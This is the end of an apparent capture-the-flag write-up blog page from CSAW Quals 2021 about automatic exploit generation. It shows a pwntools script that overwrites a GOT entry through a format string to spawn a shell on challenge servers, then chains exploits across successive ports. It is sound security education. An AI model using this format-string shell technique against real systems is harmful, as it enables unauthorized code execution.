</span><span>    context</span><span style="color:#f29e74;">.</span><span>arch </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;amd64&#39;
</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exec_fmt</span><span>(</span><span style="color:#ffcc66;">payload</span><span>):
</span><span>        p </span><span style="color:#f29e74;">= </span><span>exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">process</span><span>()
</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Report 1 in this batch!!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>()
</span><span>        p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>()
</span><span>        </span><span style="color:#ffa759;">return </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()
</span><span>    
</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">fmtstr_payload</span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">, </span><span>{memset_got</span><span style="color:#ccc9c2cc;">: </span><span>system_addr}</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">write_size</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;byte&#39;</span><span>)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;/bin/sh&quot;</span><span>)
</span><span>    </span><span style="color:#ffa759;">import </span><span>time
</span><span>    time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat message.txt&quot;</span><span>)
</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag is in another box! &quot;</span><span>)
</span><span>    message </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
</span><span>    </span><span style="color:#f28779;">print</span><span>(message)
</span><span>    searched </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>message)
</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
</span><span>    </span><span style="color:#ffa759;">return </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#ccc9c2cc;">, </span><span>searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
</span><span>    number </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
</span><span>    data </span><span style="color:#f29e74;">= </span><span>[(</span><span style="color:#ffcc66;">11001</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;cd80d3cd8a479a18bbc9652f3631c61c&quot;</span><span>)]
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">15</span><span>):
</span><span>        </span><span style="color:#f28779;">print</span><span>(number)
</span><span>        number </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span>data[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">exploit_1</span><span>(next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">False</span><span>)
</span><span>        data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
</span><span>        </span><span style="color:#f28779;">print</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">15</span><span>):
</span><span>        </span><span style="color:#f28779;">print</span><span>(number)
</span><span>        number </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span>data[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">exploit_2</span><span>(next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">False</span><span>)
</span><span>        data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
</span><span>        </span><span style="color:#f28779;">print</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">15</span><span>):
</span><span>        </span><span style="color:#f28779;">print</span><span>(number)
</span><span>        number </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span>data[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">exploit_3</span><span>(next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">False</span><span>)
</span><span>        data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
</span><span>        </span><span style="color:#f28779;">print</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">16</span><span>):
</span><span>        </span><span style="color:#f28779;">print</span><span>(number)
</span><span>        number </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span>data[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
</span><span>        next_port, next_password </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">exploit_4</span><span>(next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password</span><span style="color:#ccc9c2cc;">, </span><span>number </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">50</span><span>)
</span><span>        data</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
</span><span>        </span><span style="color:#f28779;">print</span><span>((next_port</span><span style="color:#ccc9c2cc;">, </span><span>next_password))
</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
</span><span>    </span><span style="color:#ffd580;">main</span><span>()
</span></code></pre>
<p><img src="/csaw-quals-2021/aeg_flag.png" alt="" /></p>

    </div>

    
    <div class="article-info">
        
        <div class="article-date">12 September 2021</div>
        
        <div class="article-taxonomies">
            
            
                <ul class="article-tags">
                    
                    <li><a href="https://tsheinen.github.io/tags/pwn/">#pwn</a></li>
                    
                    <li><a href="https://tsheinen.github.io/tags/automatic-exploit-gen/">#automatic-exploit-gen</a></li>
                    
                </ul>
            
        </div>
    </div>

</article>

<script>
window.onscroll = function() {
    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
        var count = 200;
        var defaults = {
          origin: { y: 0.7 }
        };

        function fire(particleRatio, opts) {
          confetti(Object.assign({}, defaults, opts, {
            particleCount: Math.floor(count * particleRatio)
          }));
        }

        fire(0.25, {
          spread: 26,
          startVelocity: 55,
        });
        fire(0.2, {
          spread: 60,
        });
        fire(0.35, {
          spread: 100,
          decay: 0.91,
          scalar: 0.8
        });
        fire(0.1, {
          spread: 120,
          startVelocity: 25,
          decay: 0.92,
          scalar: 1.2
        });
        fire(0.1, {
          spread: 120,
          startVelocity: 45,
        });
    }
}
</script>
<script type="text/javascript" src="/js/navbar.js"></script>


        </main>
        <footer>
            
            
        </footer>
    </div>



    <details data-popover="up" style="right: 20px;top: 20px;">
      <summary>
		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
      </summary>
      <div class="swatch-container">
          
            <div class="swatch-child" onclick="setTheme('Dark')">
                <div style="text-align: center;">
                  <div data-theme=Dark class="swatch">
                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
                  </div>
                  <span style="color:  var(--background-color, #000000)"> Dark </span>
              </div>
            </div>
          
            <div class="swatch-child" onclick="setTheme('Light')">
                <div style="text-align: center;">
                  <div data-theme=Light class="swatch">
                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
                  </div>
                  <span style="color:  var(--background-color, #000000)"> Light </span>
              </div>
            </div>
          
      </div>
    </details>

    <!-- Cloudflare Web Analytics -->
    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
    <!-- End Cloudflare Web Analytics -->

    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
</body>
</html>
